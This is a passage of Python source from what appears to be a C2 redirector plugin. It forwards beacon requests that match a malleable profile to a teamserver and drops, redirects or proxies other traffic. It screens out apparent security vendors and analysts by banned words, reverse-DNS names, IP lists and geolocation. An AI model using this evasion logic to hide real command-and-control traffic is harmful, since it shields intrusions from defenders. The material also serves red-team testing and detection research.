                if len(inports) != len(self.proxyOptions['teamserver_url']) and len(self.proxyOptions['teamserver_url']) > 1:
                    self.logger.fatal('Please specify inport:host:port form of teamserver-url parameter for each listening port of proxy2')

            except Exception as e:
                raise
                self.logger.fatal('Teamserver\'s URL does not follow <[https?://]host:port> scheme! {}'.format(str(e)))

            if (not self.proxyOptions['drop_action']) or (self.proxyOptions['drop_action'] not in ['redirect', 'reset', 'proxy']):
                self.logger.fatal('Drop action must be specified as either "reset", redirect" or "proxy"!')
            
            if self.proxyOptions['drop_action'] == 'proxy':
                if len(self.proxyOptions['action_url']) == 0:
                    self.logger.fatal('Drop URL must be specified for proxy action - pointing from which host to fetch responses!')
                else:
                    self.logger.info('Will redirect/proxy requests to these hosts: {}'.format(', '.join(self.proxyOptions['action_url'])), color=self.logger.colors_map['cyan'])

            if self.proxyOptions['ban_blacklisted_ip_addresses']:
                with open(self.proxyOptions['ip_addresses_blacklist_file'], 'r') as f:
                    for line in f.readlines():
                        l = line.strip()
                        if l.startswith('#') or len(l) < 7: continue

                        if '#' in l:
                            ip = l[:l.find('#')].strip()
                            comment = l[l.find('#')+1:].strip()
                            self.banned_ips[ip] = comment
                        else:
                            self.banned_ips[l] = ''

                self.logger.info('Loaded {} blacklisted CIDRs.'.format(len(self.banned_ips)))

            if self.proxyOptions['mitigate_replay_attack']:
                with SqliteDict(ProxyPlugin.RequestsHashesDatabaseFile) as mydict:
                    self.logger.info('Opening request hashes SQLite from file {} to prevent Replay Attacks.'.format(ProxyPlugin.RequestsHashesDatabaseFile))

            if 'policy' in self.proxyOptions.keys() and self.proxyOptions['policy'] != None \
                and len(self.proxyOptions['policy']) > 0:
                log = 'Enabled policies:\n'
                for k, v in self.proxyOptions['policy'].items():
                    log += '\t{}: {}\n'.format(k, str(v))
                self.logger.dbg(log)
            else:
                self.logger.info("No policies defined in config. Defaults to all-set.")
                for k, v in ProxyPlugin.DefaultRedirectorConfig['policy'].items():
                    self.proxyOptions['policy'][k] = v

            if 'add_peers_to_whitelist_if_they_sent_valid_requests' in self.proxyOptions.keys() and self.proxyOptions['add_peers_to_whitelist_if_they_sent_valid_requests'] != None \
                and len(self.proxyOptions['add_peers_to_whitelist_if_they_sent_valid_requests']) > 0:
                log = 'Dynamic peers whitelisting enabled with thresholds:\n'
                for k, v in self.proxyOptions['add_peers_to_whitelist_if_they_sent_valid_requests'].items():
                    if k not in ProxyPlugin.DefaultRedirectorConfig['add_peers_to_whitelist_if_they_sent_valid_requests'].keys():
                        self.logger.err("Dynamic whitelisting threshold named ({}) not supported! Skipped..".format(k))

                    log += '\t{}: {}\n'.format(k, str(v))
                self.logger.dbg(log)
            else:
                self.logger.info("Dynamic peers whitelisting disabled.")
                self.proxyOptions['add_peers_to_whitelist_if_they_sent_valid_requests'] = {}


    def report(self, ret, ts = '', peerIP = '', path = '', userAgentValue = ''):
        prefix = 'ALLOW'
        col = 'green'
        if ret: 
            prefix = 'DROP'
            col = 'red'

        if self.proxyOptions['report_only']:
            if ret:
                prefix = 'WOULD-BE-DROPPED'
                col = 'red'
                #self.logger.info(' (Report-Only) =========[X] REQUEST WOULD BE BLOCKED =======', color='red')
            ret = False

        self.logger.info('[{}, {}, {}] "{}" - UA: "{}"'.format(prefix, ts, peerIP, path, userAgentValue), 
            color=col, 
            forced = True,
            noprefix = True
        )
        return ret

    def get_peer_ip(self, req):
        regexes = {
            'first-ip' : r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})',
            'forwarded-ip' : r'for=(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})',
        }

        originating_ip_headers = {
            'x-forwarded-for' : regexes['first-ip'],
            'forwarded' : regexes['forwarded-ip'],
            'cf-connecting-ip' : regexes['first-ip'],
            'true-client-ip' : regexes['first-ip'],
            'x-real-ip' : regexes['first-ip'],
        }

        peerIP = req.client_address[0]

        for k, v in req.headers.items():
            if k.lower() in originating_ip_headers.keys():
                res = re.findall(originating_ip_headers[k.lower()], v, re.I)
                if res and len(res) > 0:
                    peerIP = res[0]
                    break

        return peerIP

    def interpretTeamserverUrl(self, ts):
        inport = 0
        host = ''
        scheme = ''
        port = 0

        try:
            _ts = ts.split(':')
            inport = int(_ts[0])
            ts = ':'.join(_ts[1:])
        except: pass
         
        u = urlparse(ts)
        scheme, _host = u.scheme, u.netloc
        if _host:
            host, _port = _host.split(':')
        else:
            host, _port = ts.split(':')

        port = int(_port)

        return inport, scheme, host, port

    def pickTeamserver(self, req):
        self.logger.dbg('Peer reached the server at port: ' + str(req.server.server_port))
        for s in self.proxyOptions['teamserver_url']:
            u = urlparse(req.path)
            inport, scheme, host, port = self.interpretTeamserverUrl(s)
            if inport == req.server.server_port:
                return s
            elif inport == '':
                return s

        #return req.path
        return random.choice(self.proxyOptions['teamserver_url'])

    def redirect(self, req, _target, malleable_meta):
        # Passing the request forward.
        u = urlparse(req.path)
        scheme, netloc, path = u.scheme, u.netloc, (u.path + '?' + u.query if u.query else u.path)
        target = _target
        newhost = ''
        orighost = req.headers['Host']

        if target in self.proxyOptions['teamserver_url']:
            inport, scheme, host, port = self.interpretTeamserverUrl(target)
            if not scheme: scheme = 'https'

            w = urlparse(target)
            scheme2, netloc2, path2 = w.scheme, w.netloc, (w.path + '?' + w.query if w.query else w.path)
            req.path = '{}://{}:{}{}'.format(scheme, host, port, (u.path + '?' + u.query if u.query else u.path))
            newhost = host

        else:
            if not target.startswith('http'):
                if req.is_ssl:
                    target = 'https://' + target
                else:
                    target = 'http://' + target

            w = urlparse(target)
            scheme2, netloc2, path2 = w.scheme, w.netloc, (w.path + '?' + w.query if w.query else w.path)
            if netloc2 == '': netloc2 = req.headers['Host']

            req.path = '{}://{}{}'.format(scheme2, netloc2, (u.path + '?' + u.query if u.query else u.path))
            newhost = netloc2

        if self.proxyOptions['remove_superfluous_headers'] and len(self.proxyOptions['profile']) > 0:
            self.logger.dbg('Stripping HTTP request from superfluous headers...')
            self.strip_headers(req, malleable_meta)

        self.logger.dbg('Redirecting to "{}"'.format(req.path))

        req.headers[proxy2_metadata_headers['ignore_response_decompression_errors']] = "1"
        req.headers[proxy2_metadata_headers['override_host_header']] = orighost

        return None

    def strip_headers(self, req, malleable_meta):
        if not malleable_meta or len(malleable_meta) == 0:
            self.logger.dbg("strip_headers: No malleable_meta provided!", color = 'red')
            return False

        section = malleable_meta['section']
        variant = malleable_meta['variant']

        if section == '' and variant == '':
            return False

        if section == '' or variant == '':
            self.logger.dbg("strip_headers: No section name ({}) or variant ({}) provided!".format(section, variant), color = 'red')
            return False

        if section not in self.malleable.config.keys():
            self.logger.dbg("strip_headers: Section name ({}) not found in malleable.config!".format(section), color = 'red')
            return False

        if variant not in self.malleable.config[section].keys():
            self.logger.dbg("strip_headers: Variant name ({}) not found in malleable.config[{}]!".format(variant, section), color = 'red')
            return False

        configblock = self.malleable.config[section][variant]

        reqhdrs = [x.lower() for x in req.headers.keys()]
        expectedheaders = [x[0].lower() for x in configblock['client']['header']]

        dont_touch_these_headers = [
            'user-agent', 'host'
        ]

        if 'http-config' in self.malleable.config.keys() and 'trust_x_forwarded_for' in self.malleable.config['http-config'].keys():
            if self.malleable.config['http-config']['trust_x_forwarded_for'] == True:
                dont_touch_these_headers.append('x-forwarded-for')

        for b in MalleableParser.TransactionBlocks:
            if b in configblock['client'].keys():
                if type(configblock['client'][b]) != dict: continue

                for k, v in configblock['client'][b].items():
                    if k == 'header': 
                        dont_touch_these_headers.append(v.lower())

        for h in reqhdrs:
            if h not in expectedheaders and h not in dont_touch_these_headers:
                del req.headers[h]

        strip_headers_during_forward = []
        if 'accept-encoding' not in expectedheaders: strip_headers_during_forward.append('Accept-Encoding')
        #if 'host' not in expectedheaders: strip_headers_during_forward.append('Host')

        if len(strip_headers_during_forward) > 0:
            req.headers[proxy2_metadata_headers['strip_headers_during_forward']] = ','.join(strip_headers_during_forward)

        return True


    def request_handler(self, req, req_body):
        self.is_request = True
        self.req = req
        self.req_body = req_body
        self.res = None
        self.res_body = None

        drop_request = -1
        newhost = ''
        malleable_meta = {
            'section' : '',
            'host' : '',
            'variant' : '',
            'uri' : '',
        }

        try:
            drop_request = self.drop_check(req, req_body, malleable_meta)
            host_action = 1
        except ProxyPlugin.AlterHostHeader as e:
            host_action = 2
            drop_request = True
            newhost = str(e)

        if drop_request and host_action == 1:
            if self.proxyOptions['drop_action'] == 'proxy' and self.proxyOptions['action_url']:

                url = self.proxyOptions['action_url']
                if (type(self.proxyOptions['action_url']) == list or \
                    type(self.proxyOptions['action_url']) == tuple) and \
                    len(self.proxyOptions['action_url']) > 0: 

                    url = random.choice(self.proxyOptions['action_url'])
                    self.logger.dbg('Randomly choosen redirect to URL: "{}"'.format(url))

                self.logger.err('[PROXYING invalid request from {}] {} {}'.format(
                    req.client_address[0], req.command, req.path
                ))
                return self.redirect(req, url, malleable_meta)

            return self.drop_action(req, req_body, None, None)

        elif drop_request and host_action == 2:
            self.logger.dbg('Altering host header to: "{}"'.format(newhost))
            return self.redirect(req, newhost, malleable_meta)

        if not self.proxyOptions['report_only'] and self.proxyOptions['mitigate_replay_attack']:
            with SqliteDict(ProxyPlugin.RequestsHashesDatabaseFile, autocommit=True) as mydict:
                mydict[self.computeRequestHash(req, req_body)] = 1

        if self.proxyOptions['policy']['allow_dynamic_peer_whitelisting'] and \
            len(self.proxyOptions['add_peers_to_whitelist_if_they_sent_valid_requests']) > 0 and \
            len(malleable_meta['section']) > 0 and malleable_meta['section'] in MalleableParser.ProtocolTransactions:
            with SqliteDict(ProxyPlugin.DynamicWhitelistFile, autocommit=True) as mydict:
                peerIP = self.get_peer_ip(req)
                if peerIP not in mydict.get('whitelisted_ips', []):
                    key = '{}-{}'.format(malleable_meta['section'], peerIP)
                    prev = mydict.get(key, 0) + 1
                    mydict[key] = prev

                    a = mydict.get('http-get-{}'.format(peerIP), 0)
                    b = mydict.get('http-post-{}'.format(peerIP), 0)

                    a2 = int(self.proxyOptions['add_peers_to_whitelist_if_they_sent_valid_requests']['number_of_valid_http_get_requests'])
                    b2 = int(self.proxyOptions['add_peers_to_whitelist_if_they_sent_valid_requests']['number_of_valid_http_post_requests'])

                    self.logger.info('Connected peer sent {} valid http-get and {} valid http-post requests so far, out of {}/{} required to consider him temporarily trusted'.format(
                        a, b, a2, b2
                    ), color = 'yellow')

                    if a > a2:
                        if b > b2:
                            self.logger.info('Adding connected peer ({}) to a dynamic whitelist as it reached its thresholds: ({}, {})'.format(peerIP, a, b), color='green')
                            val = mydict.get('whitelisted_ips', [])
                            val.append(peerIP.strip())
                            mydict['whitelisted_ips'] = val

        return self.redirect(req, self.pickTeamserver(req), malleable_meta)


    def response_handler(self, req, req_body, res, res_body):
        self.is_request = False
        self.req = req
        self.req_body = req_body
        self.res = res
        self.res_body = res_body

        host_action = -1
        newhost = ''
        malleable_meta = {
            'section' : '',
            'host' : '',
            'variant' : '',
            'uri' : '',
        }

        drop_request = False

        try:
            drop_request = self.drop_check(req, req_body, malleable_meta)
            host_action = 1
        except ProxyPlugin.AlterHostHeader as e:
            host_action = 2
            drop_request = True
            newhost = str(e)

        if drop_request:
            if host_action == 1:
                self.logger.dbg('Not returning body from response handler')
                return self.drop_action(req, req_body, res, res_body, True)

            elif host_action == 2:
                self.logger.dbg('Altering host header in response_handler to: "{}"'.format(newhost))
                del req.headers['Host']
                req.headers['Host'] = newhost
                req.headers[proxy2_metadata_headers['override_host_header']] = newhost

        # A nifty hack to make the proxy2 believe we actually modified the response
        # so that the proxy will not encode it to gzip (or anything specified) and just
        # return the response as-is, in an "Content-Encoding: identity" kind of fashion
        res.headers[proxy2_metadata_headers['override_response_content_encoding']] = 'identity'
        return res_body

    def drop_action(self, req, req_body, res, res_body, quiet = False):

        if self.proxyOptions['report_only']:
            self.logger.info('(Report-Only) Not taking any action on invalid request.')
            if self.is_request: 
                return req_body
            return res_body

        todo = ''
        if self.proxyOptions['drop_action'] == 'reset': todo = 'DROPPING'
        elif self.proxyOptions['drop_action'] == 'redirect': todo = 'REDIRECTING'
        elif self.proxyOptions['drop_action'] == 'proxy': todo = 'PROXYING'

        u = urlparse(req.path)
        scheme, netloc, path = u.scheme, u.netloc, (u.path + '?' + u.query if u.query else u.path)

        peer = req.client_address[0]

        try:
            resolved = socket.gethostbyaddr(req.client_address[0])[0]
            peer += ' ({})'.format(resolved)
        except:
            pass

        if not quiet: 
            self.logger.err('[{} invalid request from {}] {} {}'.format(
                todo, peer, req.command, path
            ))

        if self.proxyOptions['log_dropped'] == True:
            req_headers = req.headers
            rb = req_body
            if rb != None and len(rb) > 0:
                if type(rb) == type(b''): 
                    rb = rb.decode()
                rb = '\r\n' + rb
            else:
                rb = ''

            request = '{} {} {}\r\n{}{}'.format(
                req.command, path, 'HTTP/1.1', req_headers, rb
            )

            if not quiet: self.logger.err('\n\n{}'.format(request))

        if self.proxyOptions['drop_action'] == 'reset':
            return DropConnectionException('Not a conformant beacon request.')

        elif self.proxyOptions['drop_action'] == 'redirect':
            if self.is_request:
                return DontFetchResponseException('Not a conformant beacon request.')

            if res == None: 
                self.logger.err('Response handler received a None res object.')
                return res_body 

            url = self.proxyOptions['action_url']
            if (type(self.proxyOptions['action_url']) == list or \
                type(self.proxyOptions['action_url']) == tuple) and \
                len(self.proxyOptions['action_url']) > 0: 

                url = random.choice(self.proxyOptions['action_url'])

            res.status = 301
            res.response_version = 'HTTP/1.1'
            res.reason = 'Moved Permanently'
            res_body = '''<HTML><HEAD><meta http-equiv="content-type" content="text/html;charset=utf-8">
<TITLE>301 Moved</TITLE></HEAD><BODY>
<H1>301 Moved</H1>
The document has moved
<A HREF="{}">here</A>.
</BODY></HTML>'''.format(url)

            res.headers = {
                'Server' : 'nginx',
                'Location': url,
                'Cache-Control' : 'no-cache',
                'Content-Type':'text/html; charset=UTF-8',
            }

            if len(self.addToResHeaders) > 0:
                #res.headers.update(self.addToResHeaders)
                self.addToResHeaders.clear()

            return res_body.encode()

        elif self.proxyOptions['drop_action'] == 'proxy':
            self.logger.dbg('Proxying forward...')

        if self.is_request: 
            return req_body

        return res_body

    def computeRequestHash(self, req, req_body):
        m = hashlib.md5()
        req_headers = req.headers
        rb = req_body
        if rb != None and len(rb) > 0:
            if type(rb) == type(b''): 
                rb = rb.decode()
            rb = '\r\n' + rb
        else:
            rb = ''

        request = '{} {} {}\r\n{}{}'.format(
            req.command, req.path, 'HTTP/1.1', req_headers, rb
        )

        m.update(request.encode())
        h = m.hexdigest()
        self.logger.dbg("Requests's MD5 hash computed: {}".format(h))

        return h

    def drop_check(self, req, req_body, malleable_meta):
        peerIP = self.get_peer_ip(req)
        ts = datetime.now().strftime('%Y-%m-%d/%H:%M:%S')
        userAgentValue = ''
        if self.malleable != None:
            userAgentValue = req.headers.get('User-Agent')

        if self.proxyOptions['policy']['allow_dynamic_peer_whitelisting'] and \
            len(self.proxyOptions['add_peers_to_whitelist_if_they_sent_valid_requests']) > 0:
            with SqliteDict(ProxyPlugin.DynamicWhitelistFile) as mydict:
                if peerIP in mydict.get('whitelisted_ips', []):
                    self.logger.info('[ALLOW, {}, reason:2, {}] Peer\'s IP was added dynamically to a whitelist based on a number of allowed requests.'.format(
                        ts, peerIP
                    ), color='green')
                    return self.report(False, ts, peerIP, req.path, userAgentValue)

        # Reverse-IP lookup check
        try:
            resolved = socket.gethostbyaddr(req.client_address[0])[0]
            for part in resolved.split('.')[:-1]:
                if part.lower() in BANNED_AGENTS \
                and self.proxyOptions['policy']['drop_dangerous_ip_reverse_lookup']:
                    self.drop_reason('[DROP, {}, reason:4b, {}] peer\'s reverse-IP lookup contained banned word: "{}"'.format(ts, peerIP, part))
                    return self.report(True, ts, peerIP, req.path, userAgentValue)

        except Exception as e:
            pass

        if self.proxyOptions['ban_blacklisted_ip_addresses']:
            for cidr, _comment in self.banned_ips.items():
                if ipaddress.ip_address(peerIP) in ipaddress.ip_network(cidr, False):
                    comment = ''
                    if len(_comment) > 0:
                        comment = ' - ' + _comment

                    self.drop_reason('[DROP, {}, reason:4a, {}] Peer\'s IP address is blacklisted: ({}{})'.format(
                        ts, peerIP, cidr, comment
                    ))

                    try:
                        ipLookupDetails = self.ipLookupHelper.lookup(peerIP)

                        if ipLookupDetails and len(ipLookupDetails) > 0:
                            self.logger.info('Here is what we know about that address ({}): ({})'.format(peerIP, ipLookupDetails), color='yellow')

                    except Exception as e:
                        self.logger.err(f'IP Lookup failed for some reason on IP ({peerIP}): {e}')

                    return self.report(True, ts, peerIP, req.path, userAgentValue)

        # Banned words check
        for k, v in req.headers.items():
            kv = k.split('-')
            vv = v.split(' ') + v.split('-')
            for kv1 in kv:
                if kv1.lower() in BANNED_AGENTS and self.proxyOptions['policy']['drop_http_banned_header_names']:
                    self.drop_reason('[DROP, {}, reason:2, {}] HTTP header name contained banned word: "{}"'.format(ts, peerIP, kv1))
                    return self.report(True, ts, peerIP, req.path, userAgentValue)

            for vv1 in vv:
                if vv1.lower() in BANNED_AGENTS and self.proxyOptions['policy']['drop_http_banned_header_value']:
                    self.drop_reason('[DROP, {}, reason:3, {}] HTTP header value contained banned word: "{}"'.format(ts, peerIP, vv1))
                    return self.report(True, ts, peerIP, req.path, userAgentValue)

        if self.proxyOptions['proxy_pass'] != None and len(self.proxyOptions['proxy_pass']) > 0 \
            and self.proxyOptions['policy']['allow_proxy_pass']:
            for entry in self.proxyOptions['proxy_pass']:
                (url, host) = entry

                if re.match('^' + url + '$', req.path, re.I) != None:
                    self.logger.info('[ALLOW, {}, reason:0, {}]  Request conforms ProxyPass entry (url="{}" host="{}"). Passing request to specified host.'.format(
                        ts, peerIP, url, host
                    ), color='green')

                    del req.headers['Host']
                    req.headers['Host'] = host
                    req.headers[proxy2_metadata_headers['override_host_header']] = host
                    raise ProxyPlugin.AlterHostHeader(host)

                else:
                    self.logger.dbg('(ProxyPass) Processed request with URL ("{}"...) didnt match ProxyPass entry URL regex: "^{}$".'.format(req.path[:32], url))

        if self.proxyOptions['whitelisted_ip_addresses'] != None and len(self.proxyOptions['whitelisted_ip_addresses']) > 0:
            for cidr in self.proxyOptions['whitelisted_ip_addresses']:
                cidr = cidr.strip()
                if ipaddress.ip_address(peerIP) in ipaddress.ip_network(cidr, False):
                    self.logger.info('[ALLOW, {}, reason:1, {}] peer\'s IP address is whitelisted: ({})'.format(
                        ts, peerIP, cidr
                    ), color='green')
                    return self.report(False, ts, peerIP, req.path, userAgentValue)

        # User-agent conformancy
        if self.malleable != None:
            if userAgentValue != self.malleable.config['useragent']\
            and self.proxyOptions['policy']['drop_invalid_useragent']:
                if self.is_request:
                    self.drop_reason(f'[DROP, {ts}, reason:1, {peerIP}] inbound User-Agent differs from the one defined in C2 profile.')
                    self.logger.dbg('Inbound UA: "{}", Expected: "{}"'.format(
                        userAgentValue, self.malleable.config['useragent']))
                return self.report(True, ts, peerIP, req.path, userAgentValue)
        else:
            self.logger.dbg("(No malleable profile) User-agent test skipped, as there was no profile provided.", color='red')

        if self.proxyOptions['mitigate_replay_attack']:
            with SqliteDict(ProxyPlugin.RequestsHashesDatabaseFile) as mydict:
                if mydict.get(self.computeRequestHash(req, req_body), 0) != 0:
                    self.drop_reason(f'[DROP, {ts}, reason:0, {peerIP}] identical request seen before. Possible Replay-Attack attempt.')
                    return self.report(True, ts, peerIP, req.path, userAgentValue)

        if self.proxyOptions['verify_peer_ip_details']:
            ipLookupDetails = None
            try:
                ipLookupDetails = self.ipLookupHelper.lookup(peerIP)

                if ipLookupDetails and len(ipLookupDetails) > 0:
                    if 'organization' in ipLookupDetails.keys():
                        for orgWord in ipLookupDetails['organization']:
                            for word in orgWord.split(' '):
                                if word.lower() in BANNED_AGENTS:
                                    self.drop_reason('[DROP, {}, reason:4c, {}] peer\'s IP lookup organization field ({}) contained banned word: "{}"'.format(ts, peerIP, orgWord, word))
                                    return self.report(True, ts, peerIP, req.path, userAgentValue)

            except Exception as e:
                self.logger.err(f'IP Lookup failed for some reason on IP ({peerIP}): {e}')

            try:
                if not self.ipGeolocationDeterminer.determine(ipLookupDetails):
                    self.drop_reason('[DROP, {}, reason:4d, {}] peer\'s IP geolocation ("{}", "{}", "{}", "{}", "{}") DID NOT met expected conditions'.format(
                        ts, peerIP, ipLookupDetails['continent'], ipLookupDetails['continent_code'], ipLookupDetails['country'], ipLookupDetails['country_code'], ipLookupDetails['city'], ipLookupDetails['timezone']
                    ))
                    return self.report(True, ts, peerIP, req.path, userAgentValue)

            except Exception as e:
                self.logger.err(f'IP Geolocation determinant failed for some reason on IP ({peerIP}): {e}')


        fetched_uri = ''
        fetched_host = req.headers['Host']

        if self.malleable != None:
            for section in MalleableParser.ProtocolTransactions:
                found = False
                variant = 'default'

                block = self.malleable.config[section]

                for uri in MalleableParser.UriParameters:
                    for var in self.malleable.variants:
                        if type(block[var]) != dict: continue

                        if uri in block[var].keys():
                            _uri = block[var][uri]

                            if type(_uri) == str:
                                found = (_uri in req.path)

                            elif (type(_uri) == list or type(_uri) == tuple) and len(_uri) > 0:
                                for u in _uri:
                                    if u in req.path:
                                        found = True
                                        break

                            if found: 
                                variant = var
                                if 'client' in block[var].keys():
                                    if 'header' in block[var]['client'].keys():
                                        for header in block[var]['client']['header']:
                                            k, v = header
                                            if k.lower() == 'host':
                                                fetched_host = v
                                                break
                                break
                    if found: break

                if found:
                    malleable_meta['host'] = fetched_host if len(fetched_host) > 0 else req.headers['Host'],
                    if type(malleable_meta['host']) != str and len(malleable_meta['host']) > 0:
                        malleable_meta['host'] = malleable_meta['host'][0]

                    malleable_meta['variant'] = variant

                    if self._client_request_inspect(section, variant, req, req_body, malleable_meta, ts, peerIP): 
                        return self.report(True, ts, peerIP, req.path, userAgentValue)

                    if self.is_request:
                        self.logger.info('== Valid malleable {} (variant: {}) request inbound.'.format(section, variant))

                    break

            if (not found) and (self.proxyOptions['policy']['drop_malleable_unknown_uris']):
                self.drop_reason('[DROP, {}, reason:11a, {}] Requested URI does not align any of Malleable defined variants: "{}"'.format(ts, peerIP, req.path))
                return self.report(True, ts, peerIP, req.path, userAgentValue)
        else:
            self.logger.dbg("(No malleable profile) Request contents validation skipped, as there was no profile provided.", color='red')

        return self.report(False, ts, peerIP, req.path, userAgentValue)


    def _client_request_inspect(self, section, variant, req, req_body, malleable_meta, ts, peerIP):
        uri = req.path
        rehdrskeys = [x.lower() for x in req.headers.keys()]

        if self.malleable == None:
            self.logger.dbg("(No malleable profile) Request contents validation skipped, as there was no profile provided.", color='red')
            return False

        self.logger.dbg("Deep request inspection of URI ({}) parsed as section:{}, variant:{}".format(
                req.path, section, variant
            ))

        if section in self.malleable.config.keys() and variant in self.malleable.config[section].keys():
            uris = []

            configblock = self.malleable.config[section][variant]

            for u in MalleableParser.UriParameters:
                if u in configblock.keys(): 
                    if type(configblock[u]) == str: 
                        uris.append(configblock[u])
                    else: 
                        uris.extend(configblock[u])

            found = False
            exactmatch = True
            malleable_meta['section'] = section

            foundblocks = []
            blocks = MalleableParser.TransactionBlocks

            for _block in blocks: 
                if 'client' not in configblock.keys():
                    continue

                if _block not in configblock['client'].keys(): 
                    #self.logger.dbg('No block {} in [{}]'.format(_block, str(configblock['client'].keys())))
                    continue

                foundblocks.append(_block)
                if 'uri-append' in configblock['client'][_block].keys() or \
                    'parameter' in configblock['client'][_block].keys():
                    exactmatch = False

            for _uri in uris:
                if exactmatch == True and uri == _uri: 
                    found = True
                    if malleable_meta != None:
                        malleable_meta['uri'] = uri
                    break
                elif exactmatch == False:
                    if uri.startswith(_uri): 
                        found = True
                        malleable_meta['uri'] = uri
                        break

            if not found and self.proxyOptions['policy']['drop_malleable_unknown_uris']:
                self.drop_reason('[DROP, {}, reason:11b, {}] Requested URI does not align any of Malleable defined variants: "{}"'.format(ts, peerIP, req.path))
                return True


            if section.lower() == 'http-stager' and \
                (('uri_x64' in configblock.keys() and malleable_meta['uri'] == configblock['uri_x64']) or
                    ('uri_x86' in configblock.keys() and malleable_meta['uri'] == configblock['uri_x86'])):
                if 'host_stage' in self.malleable.config.keys() and self.malleable.config['host_stage'] == 'false':
                    self.drop_reason('[DROP, {}, reason:11c, {}] Requested URI referes to http-stager section however Payload staging was disabled: "{}"'.format(ts, peerIP, req.path))
                return True


            hdrs2 = {}
            for h in configblock['client']['header']:
                hdrs2[h[0].lower()] = h[1]

            for header in configblock['client']['header']:
                k, v = header

                if k.lower() not in rehdrskeys \
                    and self.proxyOptions['policy']['drop_malleable_without_expected_header']:
                    self.drop_reason('[DROP, {}, reason:5, {}] HTTP request did not contain expected header: "{}"'.format(ts, peerIP, k))
                    return True

                if v not in req.headers.values() \
                    and self.proxyOptions['policy']['drop_malleable_without_expected_header_value']:
                    ret = False
                    if k.lower() == 'host' and 'host' in rehdrskeys and v.lower() in [x.lower() for x in req.headers.values()]:
                        ret = True
                        del req.headers['Host']
                        req.headers['Host'] = v
                        req.headers[proxy2_metadata_headers['override_host_header']] = v

                    if not ret:
                        if 'protect_these_headers_from_tampering' in self.proxyOptions.keys() and \
                            len(self.proxyOptions['protect_these_headers_from_tampering']) > 0 and \
                            k.lower() in [x.lower() for x in self.proxyOptions['protect_these_headers_from_tampering']]:

                            self.logger.dbg('Inbound request had HTTP Header ({})=({}) however ({}) was expected. Since this header was marked for protection - restoring expected value.'.format(
                                k, req.headers[k], hdrs2[k.lower()]
                            ))

                            del req.headers[k]
                            req.headers[k] = hdrs2[k.lower()]

                        else:
                            self.drop_reason('[DROP, {}, reason:6, {}] HTTP request did not contain expected header value: "{}: {}"'.format(ts, peerIP, k, v))
                            return True

            for _block in foundblocks:
                if _block in configblock['client'].keys():
                    metadata = configblock['client'][_block]
                    metadatacontainer = ''

                    if 'header' in metadata.keys():
                        if (metadata['header'].lower() not in rehdrskeys) \
                        and self.proxyOptions['policy']['drop_malleable_without_expected_request_section']:
                            self.drop_reason('[DROP, {}, reason:7, {}] HTTP request did not contain expected {} section header: "{}"'.format(ts, peerIP, _block, metadata['header']))
                            return True

                        if rehdrskeys.count(metadata['header'].lower()) == 1:
                            metadatacontainer = req.headers[metadata['header']]
                        else:
                            metadatacontainer = [v for k, v in req.headers.items() if k.lower() == metadata['header'].lower()]

                    elif 'parameter' in metadata.keys():
                        out = parse_qs(urlsplit(req.path).query)

                        paramname = metadata['parameter']
                        if metadata['parameter'] not in out.keys() \
                        and self.proxyOptions['policy']['drop_malleable_without_request_section_in_uri']:
                            self.drop_reason('[DROP, {}, reason:8, {}] HTTP request was expected to contain {} section with parameter in URI: "{}"'.format(ts, peerIP, _block, metadata['parameter']))
                            return True

                        metadatacontainer = [metadata['parameter'], out[metadata['parameter']][0]]

                    elif 'uri-append' in metadata.keys():
                        if not self.proxyOptions['policy']['drop_malleable_with_invalid_uri_append']:
                            self.logger.dbg('Skipping uri-append validation according to drop_malleable_with_invalid_uri_append policy turned off.')
                            continue

                        metadatacontainer = req.path

                    self.logger.dbg('Metadata container: {}'.format(metadatacontainer))

                    if 'prepend' in metadata.keys():
                        if type(metadata['prepend']) == list:
                            for p in metadata['prepend']:
                                if p not in metadatacontainer \
                                and self.proxyOptions['policy']['drop_malleable_without_prepend_pattern']:
                                    self.drop_reason('[DROP, {}, reason:9, {}] Did not found prepend pattern: "{}"'.format(ts, peerIP, p))
                                    return True

                        elif type(metadata['prepend']) == str:
                            if metadata['prepend'] not in metadatacontainer \
                                and self.proxyOptions['policy']['drop_malleable_without_prepend_pattern']:
                                self.drop_reason('[DROP, {}, reason:9, {}] Did not found prepend pattern: "{}"'.format(ts, peerIP, metadata['prepend']))
                                return True

                    if 'append' in metadata.keys():
                        if type(metadata['append']) == list:
                            for p in metadata['append']:
                                if p not in metadatacontainer \
                                and self.proxyOptions['policy']['drop_malleable_without_apppend_pattern']:
                                    self.drop_reason('[DROP, {}, reason:10, {}] Did not found append pattern: "{}"'.format(ts, peerIP, p))
                                    return True

                        elif type(metadata['append']) == str:
                            if metadata['append'] not in metadatacontainer \
                                and self.proxyOptions['policy']['drop_malleable_without_apppend_pattern']:
                                self.drop_reason('[DROP, {}, reason:10, {}] Did not found append pattern: "{}"'.format(ts, peerIP, metadata['append']))
                                return True

        else:
            self.logger.err('_client_request_inspect: No section ({}) or variant ({}) specified or ones provided are invalid!'.format(section, variant))
            return True

        #self.logger.info('[{}: ALLOW] Peer\'s request is accepted'.format(peerIP), color='green')
        return False
